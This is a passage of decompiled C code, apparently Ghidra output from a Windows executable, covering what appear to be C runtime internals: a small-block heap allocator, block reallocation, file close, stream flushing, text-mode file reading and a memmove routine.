      }
      DAT_0042680c = DAT_00426818;
      puVar2 = param_1;
    }
  }
  DAT_00426810 = puVar2;
  DAT_00426808 = uVar5;
  return;
}



int * __cdecl FUN_00416cf9(uint *param_1)

{
  char *pcVar1;
  int *piVar2;
  char cVar3;
  int *piVar4;
  byte bVar5;
  uint uVar6;
  int iVar7;
  uint *puVar8;
  int iVar9;
  uint uVar10;
  int *piVar11;
  uint *puVar12;
  uint *puVar13;
  int iVar14;
  uint local_10;
  uint local_c;
  int local_8;
  
  puVar8 = DAT_00426818 + DAT_00426814 * 5;
  uVar6 = (int)param_1 + 0x17U & 0xfffffff0;
  iVar7 = ((int)((int)param_1 + 0x17U) >> 4) + -1;
  bVar5 = (byte)iVar7;
  if (iVar7 < 0x20) {
    local_10 = 0xffffffff >> (bVar5 & 0x1f);
    local_c = 0xffffffff;
  }
  else {
    local_c = 0xffffffff >> (bVar5 - 0x20 & 0x1f);
    local_10 = 0;
  }
  param_1 = DAT_0042680c;
  if (DAT_0042680c < puVar8) {
    do {
      if ((param_1[1] & local_c | *param_1 & local_10) != 0) break;
      param_1 = param_1 + 5;
    } while (param_1 < puVar8);
  }
  puVar12 = DAT_00426818;
  if (param_1 == puVar8) {
    for (; (puVar12 < DAT_0042680c && ((puVar12[1] & local_c | *puVar12 & local_10) == 0));
        puVar12 = puVar12 + 5) {
    }
    param_1 = puVar12;
    if (puVar12 == DAT_0042680c) {
      for (; (puVar12 < puVar8 && (puVar12[2] == 0)); puVar12 = puVar12 + 5) {
      }
      puVar13 = DAT_00426818;
      param_1 = puVar12;
      if (puVar12 == puVar8) {
        for (; (puVar13 < DAT_0042680c && (puVar13[2] == 0)); puVar13 = puVar13 + 5) {
        }
        param_1 = puVar13;
        if ((puVar13 == DAT_0042680c) && (param_1 = FUN_00417002(), param_1 == (uint *)0x0)) {
          return (int *)0x0;
        }
      }
      iVar7 = FUN_004170b3((int)param_1);
      *(int *)param_1[4] = iVar7;
      if (*(int *)param_1[4] == -1) {
        return (int *)0x0;
      }
    }
  }
  piVar4 = (int *)param_1[4];
  local_8 = *piVar4;
  if ((local_8 == -1) ||
     ((piVar4[local_8 + 0x31] & local_c | piVar4[local_8 + 0x11] & local_10) == 0)) {
    local_8 = 0;
    puVar8 = (uint *)(piVar4 + 0x11);
    uVar10 = piVar4[0x31] & local_c | piVar4[0x11] & local_10;
    while (uVar10 == 0) {
      puVar12 = puVar8 + 0x21;
      local_8 = local_8 + 1;
      puVar8 = puVar8 + 1;
      uVar10 = *puVar12 & local_c | local_10 & *puVar8;
    }
  }
  iVar7 = 0;
  piVar2 = piVar4 + local_8 * 0x81 + 0x51;
  local_10 = piVar4[local_8 + 0x11] & local_10;
  if (local_10 == 0) {
    local_10 = piVar4[local_8 + 0x31] & local_c;
    iVar7 = 0x20;
  }
  for (; -1 < (int)local_10; local_10 = local_10 << 1) {
    iVar7 = iVar7 + 1;
  }
  piVar11 = (int *)piVar2[iVar7 * 2 + 1];
  iVar9 = *piVar11 - uVar6;
  iVar14 = (iVar9 >> 4) + -1;
  if (0x3f < iVar14) {
    iVar14 = 0x3f;
  }
  DAT_0042680c = param_1;
  if (iVar14 != iVar7) {
    if (piVar11[1] == piVar11[2]) {
      if (iVar7 < 0x20) {
        pcVar1 = (char *)((int)piVar4 + iVar7 + 4);
        uVar10 = ~(0x80000000U >> ((byte)iVar7 & 0x1f));
        piVar4[local_8 + 0x11] = uVar10 & piVar4[local_8 + 0x11];
        *pcVar1 = *pcVar1 + -1;
        if (*pcVar1 == '\0') {
          *param_1 = *param_1 & uVar10;
        }
      }
      else {
        pcVar1 = (char *)((int)piVar4 + iVar7 + 4);
        uVar10 = ~(0x80000000U >> ((byte)iVar7 - 0x20 & 0x1f));
        piVar4[local_8 + 0x31] = piVar4[local_8 + 0x31] & uVar10;
        *pcVar1 = *pcVar1 + -1;
        if (*pcVar1 == '\0') {
          param_1[1] = param_1[1] & uVar10;
        }
      }
    }
    *(int *)(piVar11[2] + 4) = piVar11[1];
    *(int *)(piVar11[1] + 8) = piVar11[2];
    if (iVar9 == 0) goto LAB_00416fbf;
    piVar11[1] = piVar2[iVar14 * 2 + 1];
    piVar11[2] = (int)(piVar2 + iVar14 * 2);
    (piVar2 + iVar14 * 2)[1] = (int)piVar11;
    *(int **)(piVar11[1] + 8) = piVar11;
    if (piVar11[1] == piVar11[2]) {
      cVar3 = *(char *)(iVar14 + 4 + (int)piVar4);
      bVar5 = (byte)iVar14;
      if (iVar14 < 0x20) {
        *(char *)(iVar14 + 4 + (int)piVar4) = cVar3 + '\x01';
        if (cVar3 == '\0') {
          *param_1 = *param_1 | 0x80000000U >> (bVar5 & 0x1f);
        }
        piVar4[local_8 + 0x11] = piVar4[local_8 + 0x11] | 0x80000000U >> (bVar5 & 0x1f);
      }
      else {
        *(char *)(iVar14 + 4 + (int)piVar4) = cVar3 + '\x01';
        if (cVar3 == '\0') {
          param_1[1] = param_1[1] | 0x80000000U >> (bVar5 - 0x20 & 0x1f);
        }
        piVar4[local_8 + 0x31] = piVar4[local_8 + 0x31] | 0x80000000U >> (bVar5 - 0x20 & 0x1f);
      }
    }
  }
  if (iVar9 != 0) {
    *piVar11 = iVar9;
    *(int *)(iVar9 + -4 + (int)piVar11) = iVar9;
  }
LAB_00416fbf:
  piVar11 = (int *)((int)piVar11 + iVar9);
  *piVar11 = uVar6 + 1;
  *(uint *)((int)piVar11 + (uVar6 - 4)) = uVar6 + 1;
  iVar7 = *piVar2;
  *piVar2 = iVar7 + 1;
  if (((iVar7 == 0) && (param_1 == DAT_00426810)) && (local_8 == DAT_00426808)) {
    DAT_00426810 = (uint *)0x0;
  }
  *piVar4 = local_8;
  return piVar11 + 1;
}



undefined4 * FUN_00417002(void)

{
  undefined4 *puVar1;
  LPVOID pvVar2;
  
  if (DAT_00426814 == DAT_00426804) {
    pvVar2 = HeapReAlloc(DAT_0042681c,0,DAT_00426818,(DAT_00426804 * 5 + 0x50) * 4);
    if (pvVar2 == (LPVOID)0x0) {
      return (undefined4 *)0x0;
    }
    DAT_00426804 = DAT_00426804 + 0x10;
    DAT_00426818 = pvVar2;
  }
  puVar1 = (undefined4 *)((int)DAT_00426818 + DAT_00426814 * 0x14);
  pvVar2 = HeapAlloc(DAT_0042681c,8,0x41c4);
  puVar1[4] = pvVar2;
  if (pvVar2 != (LPVOID)0x0) {
    pvVar2 = VirtualAlloc((LPVOID)0x0,0x100000,0x2000,4);
    puVar1[3] = pvVar2;
    if (pvVar2 != (LPVOID)0x0) {
      puVar1[2] = 0xffffffff;
      *puVar1 = 0;
      puVar1[1] = 0;
      DAT_00426814 = DAT_00426814 + 1;
      *(undefined4 *)puVar1[4] = 0xffffffff;
      return puVar1;
    }
    HeapFree(DAT_0042681c,0,(LPVOID)puVar1[4]);
  }
  return (undefined4 *)0x0;
}



int __cdecl FUN_004170b3(int param_1)

{
  int *piVar1;
  char cVar2;
  int iVar3;
  int iVar4;
  int iVar5;
  LPVOID pvVar6;
  int *piVar7;
  int iVar8;
  int iVar9;
  int *lpAddress;
  
  iVar3 = *(int *)(param_1 + 0x10);
  iVar9 = 0;
  for (iVar4 = *(int *)(param_1 + 8); -1 < iVar4; iVar4 = iVar4 << 1) {
    iVar9 = iVar9 + 1;
  }
  iVar8 = 0x3f;
  iVar4 = iVar9 * 0x204 + 0x144 + iVar3;
  iVar5 = iVar4;
  do {
    *(int *)(iVar5 + 8) = iVar5;
    *(int *)(iVar5 + 4) = iVar5;
    iVar5 = iVar5 + 8;
    iVar8 = iVar8 + -1;
  } while (iVar8 != 0);
  lpAddress = (int *)(iVar9 * 0x8000 + *(int *)(param_1 + 0xc));
  pvVar6 = VirtualAlloc(lpAddress,0x8000,0x1000,4);
  if (pvVar6 == (LPVOID)0x0) {
    iVar9 = -1;
  }
  else {
    if (lpAddress <= lpAddress + 0x1c00) {
      piVar7 = lpAddress + 4;
      do {
        piVar7[-2] = -1;
        piVar7[0x3fb] = -1;
        piVar7[-1] = 0xff0;
        *piVar7 = (int)(piVar7 + 0x3ff);
        piVar7[1] = (int)(piVar7 + -0x401);
        piVar7[0x3fa] = 0xff0;
        piVar1 = piVar7 + 0x3fc;
        piVar7 = piVar7 + 0x400;
      } while (piVar1 <= lpAddress + 0x1c00);
    }
    *(int **)(iVar4 + 0x1fc) = lpAddress + 3;
    lpAddress[5] = iVar4 + 0x1f8;
    *(int **)(iVar4 + 0x200) = lpAddress + 0x1c03;
    lpAddress[0x1c04] = iVar4 + 0x1f8;
    *(undefined4 *)(iVar3 + 0x44 + iVar9 * 4) = 0;
    *(undefined4 *)(iVar3 + 0xc4 + iVar9 * 4) = 1;
    cVar2 = *(char *)(iVar3 + 0x43);
    *(char *)(iVar3 + 0x43) = cVar2 + '\x01';
    if (cVar2 == '\0') {
      *(uint *)(param_1 + 4) = *(uint *)(param_1 + 4) | 1;
    }
    *(uint *)(param_1 + 8) = *(uint *)(param_1 + 8) & ~(0x80000000U >> ((byte)iVar9 & 0x1f));
  }
  return iVar9;
}



undefined4 __cdecl FUN_004171ae(uint *param_1,int param_2,int param_3)

{
  char *pcVar1;
  int *piVar2;
  int iVar3;
  char cVar4;
  uint uVar5;
  int iVar6;
  uint *puVar7;
  byte bVar8;
  int iVar9;
  uint uVar10;
  uint uVar11;
  uint uVar12;
  uint uVar13;
  uint local_c;
  
  uVar5 = param_1[4];
  uVar12 = param_3 + 0x17U & 0xfffffff0;
  uVar10 = param_2 - param_1[3] >> 0xf;
  iVar3 = uVar10 * 0x204 + 0x144 + uVar5;
  iVar6 = *(int *)(param_2 + -4);
  iVar9 = iVar6 + -1;
  uVar13 = *(uint *)(iVar6 + -5 + param_2);
  iVar6 = iVar6 + -5 + param_2;
  if (iVar9 < (int)uVar12) {
    if (((uVar13 & 1) != 0) || ((int)(uVar13 + iVar9) < (int)uVar12)) {
      return 0;
    }
    local_c = ((int)uVar13 >> 4) - 1;
    if (0x3f < local_c) {
      local_c = 0x3f;
    }
    if (*(int *)(iVar6 + 4) == *(int *)(iVar6 + 8)) {
      if (local_c < 0x20) {
        pcVar1 = (char *)(local_c + 4 + uVar5);
        uVar11 = ~(0x80000000U >> ((byte)local_c & 0x1f));
        puVar7 = (uint *)(uVar5 + 0x44 + uVar10 * 4);
        *puVar7 = *puVar7 & uVar11;
        *pcVar1 = *pcVar1 + -1;
        if (*pcVar1 == '\0') {
          *param_1 = *param_1 & uVar11;
        }
      }
      else {
        pcVar1 = (char *)(local_c + 4 + uVar5);
        uVar11 = ~(0x80000000U >> ((byte)local_c - 0x20 & 0x1f));
        puVar7 = (uint *)(uVar5 + 0xc4 + uVar10 * 4);
        *puVar7 = *puVar7 & uVar11;
        *pcVar1 = *pcVar1 + -1;
        if (*pcVar1 == '\0') {
          param_1[1] = param_1[1] & uVar11;
        }
      }
    }
    *(undefined4 *)(*(int *)(iVar6 + 8) + 4) = *(undefined4 *)(iVar6 + 4);
    *(undefined4 *)(*(int *)(iVar6 + 4) + 8) = *(undefined4 *)(iVar6 + 8);
    iVar6 = uVar13 + (iVar9 - uVar12);
    if (0 < iVar6) {
      uVar13 = (iVar6 >> 4) - 1;
      iVar9 = param_2 + -4 + uVar12;
      if (0x3f < uVar13) {
        uVar13 = 0x3f;
      }
      iVar3 = iVar3 + uVar13 * 8;
      *(undefined4 *)(iVar9 + 4) = *(undefined4 *)(iVar3 + 4);
      *(int *)(iVar9 + 8) = iVar3;
      *(int *)(iVar3 + 4) = iVar9;
      *(int *)(*(int *)(iVar9 + 4) + 8) = iVar9;
      if (*(int *)(iVar9 + 4) == *(int *)(iVar9 + 8)) {
        cVar4 = *(char *)(uVar13 + 4 + uVar5);
        *(char *)(uVar13 + 4 + uVar5) = cVar4 + '\x01';
        bVar8 = (byte)uVar13;
        if (uVar13 < 0x20) {
          if (cVar4 == '\0') {
            *param_1 = *param_1 | 0x80000000U >> (bVar8 & 0x1f);
          }
          puVar7 = (uint *)(uVar5 + 0x44 + uVar10 * 4);
        }
        else {
          if (cVar4 == '\0') {
            param_1[1] = param_1[1] | 0x80000000U >> (bVar8 - 0x20 & 0x1f);
          }
          puVar7 = (uint *)(uVar5 + 0xc4 + uVar10 * 4);
          bVar8 = bVar8 - 0x20;
        }
        *puVar7 = *puVar7 | 0x80000000U >> (bVar8 & 0x1f);
      }
      piVar2 = (int *)(param_2 + -4 + uVar12);
      *piVar2 = iVar6;
      *(int *)(iVar6 + -4 + (int)piVar2) = iVar6;
    }
    *(uint *)(param_2 + -4) = uVar12 + 1;
    *(uint *)(param_2 + -8 + uVar12) = uVar12 + 1;
  }
  else if ((int)uVar12 < iVar9) {
    param_3 = iVar9 - uVar12;
    *(uint *)(param_2 + -4) = uVar12 + 1;
    piVar2 = (int *)(param_2 + -4 + uVar12);
    uVar11 = (param_3 >> 4) - 1;
    piVar2[-1] = uVar12 + 1;
    if (0x3f < uVar11) {
      uVar11 = 0x3f;
    }
    if ((uVar13 & 1) == 0) {
      uVar12 = ((int)uVar13 >> 4) - 1;
      if (0x3f < uVar12) {
        uVar12 = 0x3f;
      }
      if (*(int *)(iVar6 + 4) == *(int *)(iVar6 + 8)) {
        if (uVar12 < 0x20) {
          pcVar1 = (char *)(uVar12 + 4 + uVar5);
          uVar12 = ~(0x80000000U >> ((byte)uVar12 & 0x1f));
          puVar7 = (uint *)(uVar5 + 0x44 + uVar10 * 4);
          *puVar7 = *puVar7 & uVar12;
          *pcVar1 = *pcVar1 + -1;
          if (*pcVar1 == '\0') {
            *param_1 = *param_1 & uVar12;
          }
        }
        else {
          pcVar1 = (char *)(uVar12 + 4 + uVar5);
          uVar12 = ~(0x80000000U >> ((byte)uVar12 - 0x20 & 0x1f));
          puVar7 = (uint *)(uVar5 + 0xc4 + uVar10 * 4);
          *puVar7 = *puVar7 & uVar12;
          *pcVar1 = *pcVar1 + -1;
          if (*pcVar1 == '\0') {
            param_1[1] = param_1[1] & uVar12;
          }
        }
      }
      *(undefined4 *)(*(int *)(iVar6 + 8) + 4) = *(undefined4 *)(iVar6 + 4);
      *(undefined4 *)(*(int *)(iVar6 + 4) + 8) = *(undefined4 *)(iVar6 + 8);
      param_3 = param_3 + uVar13;
      uVar11 = (param_3 >> 4) - 1;
      if (0x3f < uVar11) {
        uVar11 = 0x3f;
      }
    }
    iVar6 = iVar3 + uVar11 * 8;
    piVar2[1] = *(int *)(iVar3 + 4 + uVar11 * 8);
    piVar2[2] = iVar6;
    *(int **)(iVar6 + 4) = piVar2;
    *(int **)(piVar2[1] + 8) = piVar2;
    if (piVar2[1] == piVar2[2]) {
      cVar4 = *(char *)(uVar11 + 4 + uVar5);
      *(char *)(uVar11 + 4 + uVar5) = cVar4 + '\x01';
      bVar8 = (byte)uVar11;
      if (uVar11 < 0x20) {
        if (cVar4 == '\0') {
          *param_1 = *param_1 | 0x80000000U >> (bVar8 & 0x1f);
        }
        puVar7 = (uint *)(uVar5 + 0x44 + uVar10 * 4);
      }
      else {
        if (cVar4 == '\0') {
          param_1[1] = param_1[1] | 0x80000000U >> (bVar8 - 0x20 & 0x1f);
        }
        puVar7 = (uint *)(uVar5 + 0xc4 + uVar10 * 4);
        bVar8 = bVar8 - 0x20;
      }
      *puVar7 = *puVar7 | 0x80000000U >> (bVar8 & 0x1f);
    }
    *piVar2 = param_3;
    *(int *)(param_3 + -4 + (int)piVar2) = param_3;
  }
  return 1;
}



undefined4 __cdecl FUN_004174a4(uint param_1)

{
  int iVar1;
  int iVar2;
  HANDLE hObject;
  BOOL BVar3;
  DWORD DVar4;
  int iVar5;
  
  if (DAT_00426800 <= param_1) {
    DAT_00425198 = 0;
    DAT_00425194 = 9;
    return 0xffffffff;
  }
  iVar5 = (param_1 & 0x1f) * 8;
  if ((*(byte *)((&DAT_00426700)[(int)param_1 >> 5] + 4 + iVar5) & 1) == 0) {
    DAT_00425194 = 9;
    DAT_00425198 = 0;
    return 0xffffffff;
  }
  iVar1 = FUN_0041c36b(param_1);
  if (iVar1 != -1) {
    if ((param_1 == 1) || (param_1 == 2)) {
      iVar1 = FUN_0041c36b(2);
      iVar2 = FUN_0041c36b(1);
      if (iVar2 == iVar1) goto LAB_0041751d;
    }
    hObject = (HANDLE)FUN_0041c36b(param_1);
    BVar3 = CloseHandle(hObject);
    if (BVar3 == 0) {
      DVar4 = GetLastError();
      goto LAB_0041751f;
    }
  }
LAB_0041751d:
  DVar4 = 0;
LAB_0041751f:
  FUN_0041c2f1(param_1);
  *(undefined *)((&DAT_00426700)[(int)param_1 >> 5] + 4 + iVar5) = 0;
  if (DVar4 == 0) {
    return 0;
  }
  FUN_0041a0e2(DVar4);
  return 0xffffffff;
}



void __cdecl FUN_00417557(undefined4 *param_1)

{
  if (((param_1[3] & 0x83) != 0) && ((param_1[3] & 8) != 0)) {
    FUN_004150a9((LPVOID)param_1[2]);
    *(ushort *)(param_1 + 3) = *(ushort *)(param_1 + 3) & 0xfbf7;
    *param_1 = 0;
    param_1[2] = 0;
    param_1[1] = 0;
  }
  return;
}



int __cdecl FUN_00417582(int *param_1)

{
  int iVar1;
  
  if (param_1 == (int *)0x0) {
    iVar1 = FUN_00417622(0);
    return iVar1;
  }
  iVar1 = FUN_004175bd(param_1);
  if (iVar1 != 0) {
    return -1;
  }
  if ((*(byte *)((int)param_1 + 0xd) & 0x40) != 0) {
    iVar1 = FUN_0041c3a8(param_1[4]);
    return -(uint)(iVar1 != 0);
  }
  return 0;
}



undefined4 __cdecl FUN_004175bd(int *param_1)

{
  uint uVar1;
  undefined4 uVar2;
  uint uVar3;
  
  uVar2 = 0;
  if ((((byte)param_1[3] & 3) == 2) && ((param_1[3] & 0x108U) != 0)) {
    uVar3 = *param_1 - (int)(char *)param_1[2];
    if (0 < (int)uVar3) {
      uVar1 = FUN_00419e88(param_1[4],(char *)param_1[2],uVar3);
      if (uVar1 == uVar3) {
        if ((param_1[3] & 0x80U) != 0) {
          param_1[3] = param_1[3] & 0xfffffffd;
        }
      }
      else {
        param_1[3] = param_1[3] | 0x20;
        uVar2 = 0xffffffff;
      }
    }
  }
  param_1[1] = 0;
  *param_1 = param_1[2];
  return uVar2;
}



int __cdecl FUN_00417622(int param_1)

{
  int *piVar1;
  int iVar2;
  int iVar3;
  int iVar4;
  int iVar5;
  
  iVar4 = 0;
  iVar3 = 0;
  iVar5 = 0;
  if (0 < DAT_004266e0) {
    do {
      piVar1 = *(int **)(DAT_004256c8 + iVar4 * 4);
      if ((piVar1 != (int *)0x0) && ((piVar1[3] & 0x83U) != 0)) {
        if (param_1 == 1) {
          iVar2 = FUN_00417582(piVar1);
          if (iVar2 != -1) {
            iVar3 = iVar3 + 1;
          }
        }
        else if ((param_1 == 0) && ((piVar1[3] & 2U) != 0)) {
          iVar2 = FUN_00417582(piVar1);
          if (iVar2 == -1) {
            iVar5 = -1;
          }
        }
      }
      iVar4 = iVar4 + 1;
    } while (iVar4 < DAT_004266e0);
  }
  if (param_1 != 1) {
    iVar3 = iVar5;
  }
  return iVar3;
}



uint __cdecl FUN_0041768f(byte **param_1)

{
  byte bVar1;
  byte *pbVar2;
  byte *pbVar3;
  undefined *puVar4;
  
  pbVar3 = param_1[3];
  if ((((uint)pbVar3 & 0x83) != 0) && (((uint)pbVar3 & 0x40) == 0)) {
    if (((uint)pbVar3 & 2) == 0) {
      param_1[3] = (byte *)((uint)pbVar3 | 1);
      if (((uint)pbVar3 & 0x10c) == 0) {
        FUN_0041c3ff(param_1);
      }
      else {
        *param_1 = param_1[2];
      }
      pbVar3 = (byte *)FUN_00417768((uint)param_1[4],(char *)param_1[2],(char *)param_1[6]);
      param_1[1] = pbVar3;
      if ((pbVar3 != (byte *)0x0) && (pbVar3 != (byte *)0xffffffff)) {
        if (((uint)param_1[3] & 0x82) == 0) {
          pbVar2 = param_1[4];
          if (pbVar2 == (byte *)0xffffffff) {
            puVar4 = &DAT_00408710;
          }
          else {
            puVar4 = (undefined *)((&DAT_00426700)[(int)pbVar2 >> 5] + ((uint)pbVar2 & 0x1f) * 8);
          }
          if ((puVar4[4] & 0x82) == 0x82) {
            param_1[3] = (byte *)((uint)param_1[3] | 0x2000);
          }
        }
        if (((param_1[6] == (byte *)0x200) && (((uint)param_1[3] & 8) != 0)) &&
           (((uint)param_1[3] & 0x400) == 0)) {
          param_1[6] = (byte *)0x1000;
        }
        param_1[1] = pbVar3 + -1;
        bVar1 = **param_1;
        *param_1 = *param_1 + 1;
        return (uint)bVar1;
      }
      param_1[3] = (byte *)((uint)param_1[3] | (-(uint)(pbVar3 != (byte *)0x0) & 0x10) + 0x10);
      param_1[1] = (byte *)0x0;
    }
    else {
      param_1[3] = (byte *)((uint)pbVar3 | 0x20);
    }
  }
  return 0xffffffff;
}



int __cdecl FUN_00417768(uint param_1,char *param_2,char *param_3)

{
  int *piVar1;
  byte *pbVar2;
  char cVar3;
  byte bVar4;
  BOOL BVar5;
  DWORD DVar6;
  int iVar7;
  char *pcVar8;
  DWORD local_10;
  char *local_c;
  char local_5;
  
  if (param_1 < DAT_00426800) {
    iVar7 = (param_1 & 0x1f) * 8;
    piVar1 = &DAT_00426700 + ((int)param_1 >> 5);
    bVar4 = *(byte *)((&DAT_00426700)[(int)param_1 >> 5] + iVar7 + 4);
    if ((bVar4 & 1) != 0) {
      local_c = (char *)0x0;
      if ((param_3 == (char *)0x0) || ((bVar4 & 2) != 0)) {
        return 0;
      }
      pcVar8 = param_2;
      if (((bVar4 & 0x48) != 0) &&
         (cVar3 = *(char *)((&DAT_00426700)[(int)param_1 >> 5] + iVar7 + 5), cVar3 != '\n')) {
        param_3 = param_3 + -1;
        *param_2 = cVar3;
        pcVar8 = param_2 + 1;
        local_c = (char *)0x1;
        *(undefined *)(*piVar1 + 5 + iVar7) = 10;
      }
      BVar5 = ReadFile(*(HANDLE *)(*piVar1 + iVar7),pcVar8,(DWORD)param_3,&local_10,
                       (LPOVERLAPPED)0x0);
      if (BVar5 == 0) {
        DVar6 = GetLastError();
        if (DVar6 == 5) {
          DAT_00425194 = 9;
          DAT_00425198 = 5;
          return -1;
        }
        if (DVar6 != 0x6d) {
          FUN_0041a0e2(DVar6);
          return -1;
        }
        return 0;
      }
      bVar4 = *(byte *)(*piVar1 + 4 + iVar7);
      if ((bVar4 & 0x80) == 0) {
        return (int)local_c + local_10;
      }
      if ((local_10 == 0) || (*param_2 != '\n')) {
        bVar4 = bVar4 & 0xfb;
      }
      else {
        bVar4 = bVar4 | 4;
      }
      *(byte *)(*piVar1 + 4 + iVar7) = bVar4;
      param_3 = param_2;
      local_c = param_2 + (int)local_c + local_10;
      pcVar8 = param_2;
      if (param_2 < local_c) {
        do {
          cVar3 = *param_3;
          if (cVar3 == '\x1a') {
            pbVar2 = (byte *)(*piVar1 + 4 + iVar7);
            bVar4 = *pbVar2;
            if ((bVar4 & 0x40) == 0) {
              *pbVar2 = bVar4 | 2;
            }
            break;
          }
          if (cVar3 == '\r') {
            if (param_3 < local_c + -1) {
              if (param_3[1] == '\n') {
                param_3 = param_3 + 2;
                goto LAB_004178fe;
              }
              *pcVar8 = '\r';
              pcVar8 = pcVar8 + 1;
              param_3 = param_3 + 1;
            }
            else {
              param_3 = param_3 + 1;
              BVar5 = ReadFile(*(HANDLE *)(*piVar1 + iVar7),&local_5,1,&local_10,(LPOVERLAPPED)0x0);
              if (((BVar5 == 0) && (DVar6 = GetLastError(), DVar6 != 0)) || (local_10 == 0)) {
LAB_00417918:
                *pcVar8 = '\r';
LAB_0041791b:
                pcVar8 = pcVar8 + 1;
              }
              else if ((*(byte *)(*piVar1 + 4 + iVar7) & 0x48) == 0) {
                if ((pcVar8 == param_2) && (local_5 == '\n')) {
LAB_004178fe:
                  *pcVar8 = '\n';
                  goto LAB_0041791b;
                }
                FUN_00417e5b(param_1,-1,1);
                if (local_5 != '\n') goto LAB_00417918;
              }
              else {
                if (local_5 == '\n') goto LAB_004178fe;
                *pcVar8 = '\r';
                pcVar8 = pcVar8 + 1;
                *(char *)(*piVar1 + 5 + iVar7) = local_5;
              }
            }
          }
          else {
            *pcVar8 = cVar3;
            pcVar8 = pcVar8 + 1;
            param_3 = param_3 + 1;
          }
        } while (param_3 < local_c);
      }
      return (int)pcVar8 - (int)param_2;
    }
  }
  DAT_00425198 = 0;
  DAT_00425194 = 9;
  return -1;
}



undefined4 * __cdecl FUN_00417960(undefined4 *param_1,undefined4 *param_2,uint param_3)

{
  uint uVar1;
  uint uVar2;
  undefined4 *puVar3;
  undefined4 *puVar4;
  
  if ((param_2 < param_1) && (param_1 < (undefined4 *)(param_3 + (int)param_2))) {
    puVar3 = (undefined4 *)((param_3 - 4) + (int)param_2);
    puVar4 = (undefined4 *)((param_3 - 4) + (int)param_1);
    if (((uint)puVar4 & 3) == 0) {
      uVar1 = param_3 >> 2;
      uVar2 = param_3 & 3;
      if (7 < uVar1) {
        for (; uVar1 != 0; uVar1 = uVar1 - 1) {
          *puVar4 = *puVar3;
          puVar3 = puVar3 + -1;
          puVar4 = puVar4 + -1;
        }
        switch(uVar2) {
        case 0:
          return param_1;
        case 2:
          goto switchD_00417b17_caseD_2;
        case 3:
          goto switchD_00417b17_caseD_3;
        }
        goto switchD_00417b17_caseD_1;
      }
    }
    else {
      switch(param_3) {
      case 0:
        goto switchD_00417b17_caseD_0;
      case 1:
        goto switchD_00417b17_caseD_1;
      case 2:
        goto switchD_00417b17_caseD_2;
      case 3:
        goto switchD_00417b17_caseD_3;
      default:
        uVar1 = param_3 - ((uint)puVar4 & 3);
        switch((uint)puVar4 & 3) {
        case 1:
          uVar2 = uVar1 & 3;
          *(undefined *)((int)puVar4 + 3) = *(undefined *)((int)puVar3 + 3);
          puVar3 = (undefined4 *)((int)puVar3 + -1);
          uVar1 = uVar1 >> 2;
          puVar4 = (undefined4 *)((int)puVar4 - 1);
          if (7 < uVar1) {
            for (; uVar1 != 0; uVar1 = uVar1 - 1) {
              *puVar4 = *puVar3;
              puVar3 = puVar3 + -1;
              puVar4 = puVar4 + -1;
            }
            switch(uVar2) {
            case 0:
              return param_1;
            case 2:
              goto switchD_00417b17_caseD_2;
            case 3:
              goto switchD_00417b17_caseD_3;
            }
            goto switchD_00417b17_caseD_1;
          }
          break;
        case 2:
          uVar2 = uVar1 & 3;
          *(undefined *)((int)puVar4 + 3) = *(undefined *)((int)puVar3 + 3);
          uVar1 = uVar1 >> 2;
          *(undefined *)((int)puVar4 + 2) = *(undefined *)((int)puVar3 + 2);
          puVar3 = (undefined4 *)((int)puVar3 + -2);
          puVar4 = (undefined4 *)((int)puVar4 - 2);
          if (7 < uVar1) {
            for (; uVar1 != 0; uVar1 = uVar1 - 1) {
              *puVar4 = *puVar3;
              puVar3 = puVar3 + -1;
              puVar4 = puVar4 + -1;
            }
            switch(uVar2) {
            case 0:
              return param_1;
            case 2:
              goto switchD_00417b17_caseD_2;
            case 3:
              goto switchD_00417b17_caseD_3;
            }
            goto switchD_00417b17_caseD_1;
          }
          break;
        case 3:
          uVar2 = uVar1 & 3;
          *(undefined *)((int)puVar4 + 3) = *(undefined *)((int)puVar3 + 3);
          *(undefined *)((int)puVar4 + 2) = *(undefined *)((int)puVar3 + 2);
          uVar1 = uVar1 >> 2;
          *(undefined *)((int)puVar4 + 1) = *(undefined *)((int)puVar3 + 1);
          puVar3 = (undefined4 *)((int)puVar3 + -3);
          puVar4 = (undefined4 *)((int)puVar4 - 3);
          if (7 < uVar1) {
            for (; uVar1 != 0; uVar1 = uVar1 - 1) {
              *puVar4 = *puVar3;
              puVar3 = puVar3 + -1;
              puVar4 = puVar4 + -1;
            }
            switch(uVar2) {
            case 0:
              return param_1;
            case 2:
              goto switchD_00417b17_caseD_2;
            case 3:
              goto switchD_00417b17_caseD_3;
            }
            goto switchD_00417b17_caseD_1;
          }
        }
      }
    }
    switch(uVar1) {
    case 7:
      puVar4[7 - uVar1] = puVar3[7 - uVar1];
    case 6:
      puVar4[6 - uVar1] = puVar3[6 - uVar1];
    case 5:
      puVar4[5 - uVar1] = puVar3[5 - uVar1];
    case 4:
      puVar4[4 - uVar1] = puVar3[4 - uVar1];
    case 3:
      puVar4[3 - uVar1] = puVar3[3 - uVar1];
    case 2:
      puVar4[2 - uVar1] = puVar3[2 - uVar1];
    case 1:
      puVar4[1 - uVar1] = puVar3[1 - uVar1];
      puVar3 = puVar3 + -uVar1;
      puVar4 = puVar4 + -uVar1;
    }
    switch(uVar2) {
    case 1:
switchD_00417b17_caseD_1:
      *(undefined *)((int)puVar4 + 3) = *(undefined *)((int)puVar3 + 3);
      return param_1;
    case 2:
switchD_00417b17_caseD_2:
      *(undefined *)((int)puVar4 + 3) = *(undefined *)((int)puVar3 + 3);
      *(undefined *)((int)puVar4 + 2) = *(undefined *)((int)puVar3 + 2);
      return param_1;
    case 3:
switchD_00417b17_caseD_3:
      *(undefined *)((int)puVar4 + 3) = *(undefined *)((int)puVar3 + 3);
      *(undefined *)((int)puVar4 + 2) = *(undefined *)((int)puVar3 + 2);
      *(undefined *)((int)puVar4 + 1) = *(undefined *)((int)puVar3 + 1);
      return param_1;
    }
switchD_00417b17_caseD_0:
    return param_1;
  }
  puVar3 = param_1;
  if (((uint)param_1 & 3) == 0) {
    uVar1 = param_3 >> 2;
    uVar2 = param_3 & 3;
    if (7 < uVar1) {
      for (; uVar1 != 0; uVar1 = uVar1 - 1) {
        *puVar3 = *param_2;
        param_2 = param_2 + 1;
        puVar3 = puVar3 + 1;
      }
      switch(uVar2) {
      case 0:
        return param_1;
      case 2:
        goto switchD_00417995_caseD_2;
      case 3:
        goto switchD_00417995_caseD_3;
      }
      goto switchD_00417995_caseD_1;
    }
  }
  else {
    switch(param_3) {
    case 0:
      goto switchD_00417995_caseD_0;
    case 1:
      goto switchD_00417995_caseD_1;
